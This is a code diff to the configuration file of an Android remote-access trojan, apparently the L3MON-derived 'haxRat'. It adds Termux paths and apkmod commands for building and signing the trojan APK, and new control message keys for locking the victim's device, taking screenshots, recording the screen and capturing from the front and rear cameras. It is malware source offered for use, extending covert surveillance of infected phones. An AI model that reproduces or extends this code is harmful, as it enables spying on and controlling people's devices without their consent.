@@ -6,9 +6,13 @@ exports.web_port = 22533;
 exports.control_port = 22222;
 
 // Paths
+
+exports.termux = '/data/data/com.termux/files/home'
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
 exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
 
+exports.termuxApkBuildPath = exports.termux + '/haxrat/build.apk'
+exports.termuxApkSignedBuildPath = exports.termux + '/haxrat/haxRat.apk'
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
 
@@ -17,6 +21,8 @@ exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
 
+exports.termuxBuildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -o "' + exports.termuxApkBuildPath + '"';
+exports.termuxSignCommand = 'apkmod -s "' + exports.termuxApkBuildPath + '"' + ' -o ' + '"' + exports.termuxApkSignedBuildPath + '"' ;
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
 exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
 
@@ -33,7 +39,12 @@ exports.messageKeys = {
     clipboard: '0xCB',
     installed: '0xIN',
     permissions: '0xPM',
-    gotPermission: '0xGP'
+    gotPermission: '0xGP',
+    lockDevice: '0xLD',
+    screenShot: '0xSS',
+    screenRecord: '0xSR',
+    rearCam: '0xRC',
+    frontCam: '0xFC'
 }
 
 exports.logTypes = {
